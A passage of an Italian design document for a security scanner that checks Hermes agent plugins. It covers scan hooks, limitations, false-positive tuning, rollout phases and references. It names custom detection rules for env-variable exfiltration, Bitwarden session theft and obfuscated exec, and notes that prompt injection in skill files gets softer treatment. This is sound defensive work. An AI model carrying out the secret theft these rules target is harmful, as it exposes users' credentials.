2. Hook on_plugin_install/update → plugin_security_scan
3. Scan completo (L0→L1→L2→L3 opzionale)
4. Se passa → installato e attivato
5. Se fallisce → installazione annullata, notifica con findings
```

### 12.3 Scansione manuale periodica

```text
1. Cron: hermes-ops-kit plugin scan --scheduled
2. Verifica TTL cache
3. Plugin con cache scaduta → rescan
4. Report inviato via notifica Hermes
5. Findings critici → alert immediato
```

---

## 13. Limitazioni e False Positives

### 13.1 Cosa lo scanner NON può rilevare

- **Malware polimorfico** — codice che cambia forma a ogni esecuzione
- **Time bombs** — codice che si attiva solo a una data/ora specifica
- **Logic bombs** — codice malevolo attivato da condizioni complesse
- **Side-channel attacks** — esfiltrazione dati via timing, power analysis
- **Zero-day nelle dipendenze** — vulnerabilità non ancora scoperte
- **Social engineering nei SKILL.md** — istruzioni malevole scritte in linguaggio naturale

### 13.2 Strategia anti False Positives

**Implementato in v0.2.0:**

- **Shannon entropy check:** Le chiavi con entropia <3.2 bits/char vengono declassate (le chiavi reali sono random, `sk-abc123xyz789...` no). Threshold tarata empiricamente su chiavi reali vs. test fixtures.
- **Rilevamento pattern sequenziali:** `abc123`, `def456`, `xyz789`, `leak`, `xxx`, `<KEY>`, `<TOKEN>` e altre sequenze dummy vengono rilevate e declassate a INFO.
- **Doc mode:** Finding in file `.md`/`SKILL.md`/`CHANGELOG.md`/`CLAUDE.md` vengono declassati di un livello (ERROR→WARNING, WARNING→INFO) — la documentazione contiene naturalmente esempi.
- **Test mode:** Finding in directory `tests/` con pattern dummy vengono declassati a INFO.
- **Skill vs Code auto-detection:** Plugin con >60% file `.md` vengono classificati come "skill" (contesto AI, non codice eseguibile). I pattern di prompt injection in una skill di red-teaming sono il suo _topic_, non un attacco.
- **Score cap:** Nessun finding CRITICAL individuale → max HIGH; nessun HIGH → max MEDIUM. Previene l'inflazione del rischio da aggregazione di finding a bassa severità.
- **Rule overrides:** Per-rule per-plugin fine-grained control (`allow`, `downgrade:warning`, `downgrade:info`) in `plugin_policy.json` v2.
- **Risultato:** 12 plugin bloccati → 0 bloccati nello scan di produzione attuale (28 plugin totali).

**Pianificato ma non ancora implementato:**

- **Graduated response:** Mai bloccare su singolo match L1 a meno che non sia CRITICAL. Richiedere conferma su più pattern.
- **Scoring system:** Ogni finding ha un peso. Somma pesi > threshold → azione. (Parzialmente implementato — scoring esiste ma non è multi-pattern)
- **Allowlist:** L'utente può allowlistare pattern specifici per plugin fidati. (Implementato via rule overrides)
- **Review mode:** Plugin sospetti ma non chiaramente malevoli vanno in "review" invece che blocked. (Non ancora)

---

## 14. Rollout Strategy

### Fase 1: Fondamenta + Semgrep First ✅ COMPLETATA (v0.1.0 — Giugno 2026)

- SHA cache SQLite con Merkle tree
- Categorie `secrets` (regex patterns + gitleaks) e `policy` (Semgrep + regole custom Hermes)
- **Semgrep engine**: subprocess runner, regole community caching, 2,500+ regole p/security + p/secrets
- **Regole custom Hermes**: `hermes-env-exfiltration`, `hermes-bitwarden-session-steal`, `hermes-obfuscated-exec`, `hermes-setup-script-dangerous` (vedi §9.3)
- **Sistema categorie + profili**: `plugin_scanner.yaml`, profili `startup`/`install`/`update`/`manual`/`ci`
- CLI base: `plugin scan --profile`, `plugin config`, `plugin rules update`, `plugin cache show`
- **Approval & disable-by-default (§7):** `plugin approve` / `revoke` / `disable` / `enable` / `policy`, con `plugin_policy.json` atomico e audit JSONL
- Integrazione con `policy/engine.py` (PolicyDecision per plugin)

### Fase 1.5: Anti-False-Positive Tuning ✅ COMPLETATA (v0.2.0 — Giugno 2026)

- **Shannon entropy check** per distinguere chiavi reali da test fixtures
- **Rilevamento pattern sequenziali** (`abc123`, `def456`, dummy words)
- **Doc/Test/Skill mode** con severity downgrade automatico
- **Skill vs Code auto-detection** (>60% `.md` → trattamento soft)
- **Score cap** (nessun CRITICAL finding → max HIGH; nessun HIGH → max MEDIUM)
- **Rule overrides** (`plugin override <plugin> <rule> <action>`) in `plugin_policy.json` v2
- **Approval reflection** (plugin approvati → MEDIUM, non BLOCKED)
- **Bandit integration** come complemento Python-specifico a Semgrep
- **External tools guide** (`docs/external-security-tools.md`) con istruzioni per piattaforma
- **Integration test suite** (`scripts/test-scanner.sh`, 10 test automatizzati)
- **Risultato:** 12 plugin bloccati → 0 bloccati (28 plugin, 157 test)

### Fase 2: Categorie Approfondite (2-3 settimane)

- Categoria `code`: entropy analyzer, AST density scanner, Semgrep p/quality
- Categoria `dependencies`: Semgrep Supply Chain (npm + PyPI + Gem audit in unico tool)
- Categoria `reputation`: OSSF Scorecard integration (repo scoring pre-install)
- Integrazione **Bandit** come complemento Python-specifico a Semgrep
- CLI: `plugin audit --json`, `plugin scan --explain`
- Alerting via hook Hermes per findings medium+

### Fase 3: Sandbox & Threat Intel Esterna (2-3 settimane)

- Categoria `behavior`: Docker sandbox dry-run con profile hardened
- Categoria `reputation`: VirusTotal API (hash lookup), Socket.dev (supply chain npm/PyPI)
- Hook Hermes attivi: `on_startup`, `on_plugin_install`, `on_plugin_update`, `on_plugin_uninstall`
- Scoring engine: weighted scoring algorithm con soglie configurabili (vedi §10.5)
- Notifiche desktop + logging JSONL per ogni scansione

### Fase 4: Polish & Community (1-2 settimane)

- Dashboard TUI interattiva (`hermes-ops-kit plugin dashboard`)
- Integrazione con Clarvia AEO scoring per MCP tools
- Regole Semgrep community contribuite upstream
- Documentazione e best practices per maintainer plugin
- Pubblicazione come standard di sicurezza per l'ecosistema Hermes

---

## 15. Riferimenti

### Ecosistema Hermes

- [awesome-hermes-agent](https://github.com/SamurAIGPT/awesome-hermes-agent) — Catalogo plugin ecosistema
- [Hermes Agent](https://github.com/NousResearch/hermes-agent) — Core repo (134k+ stars)
- [agentskills.io](https://agentskills.io) — Standard aperto per skill AI
- [Clarvia](https://github.com/clarvia-project/scanner) — AEO scoring per MCP tools (15,400+ server)

### SAST & Semgrep

- [Semgrep](https://semgrep.dev) — SAST engine multi-linguaggio, 2,500+ regole community
- [Semgrep Registry](https://semgrep.dev/explore) — Catalogo regole community (p/security, p/secrets, p/supply-chain, p/quality)
- [Semgrep Docs](https://semgrep.dev/docs) — Documentazione ufficiale, custom rules, taint tracking
- [Semgrep Supply Chain](https://semgrep.dev/products/semgrep-supply-chain) — Dependency scanning (npm, PyPI, Gem, Maven)
- [Bandit](https://bandit.readthedocs.io) — Python security linter (AST-based, 70+ regole)

### Secrets Detection

- [truffleHog](https://github.com/trufflesecurity/trufflehog) — Secret scanner (entropy + regex + git history)
- [gitleaks](https://github.com/gitleaks/gitleaks) — Git secret scanner (150+ regole predefinite)
- [detect-secrets](https://github.com/Yelp/detect-secrets) — Yelp's secret scanner, plugin-based

### Threat Intelligence

- [OSSF Scorecard](https://securityscorecards.dev) — 18 metriche automatiche sicurezza repo
- [VirusTotal API v3](https://developers.virustotal.com/reference) — Threat intelligence API (70+ engine)
- [Socket.dev](https://socket.dev) — Supply chain security per npm/PyPI
- [GitHub Advisory DB](https://github.com/advisories) — CVE database, GraphQL API
- [AbuseIPDB](https://abuseipdb.com) — IP/domain reputation

### Sandbox & Isolation

- [Docker Security](https://docs.docker.com/engine/security) — Container hardening
- [gVisor](https://github.com/google/gvisor) — User-space kernel, syscall interception
- [Firejail](https://github.com/netblue30/firejail) — Linux namespaces + seccomp sandbox

### Code Quality & Obfuscation

- [ESLint](https://eslint.org) — JavaScript/TypeScript linter
- [Shannon Entropy](<https://en.wikipedia.org/wiki/Entropy_(information_theory)>) — Entropy calculation for obfuscation detection
